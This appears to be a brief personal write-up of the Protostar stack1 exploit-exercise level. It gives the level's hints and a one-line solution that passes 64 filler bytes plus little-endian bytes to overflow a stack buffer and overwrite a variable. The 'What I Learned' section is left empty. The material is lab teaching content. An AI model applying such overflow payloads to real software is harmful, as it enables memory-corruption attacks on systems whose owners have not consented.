# Link
https://exploit-exercises.com/protostar/stack1/

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints

If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
Protostar is little endian

# Solution
user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "a"*64+"\x64\x63\x62\x61"'`

you have correctly got the variable to the right value

# What I Learned
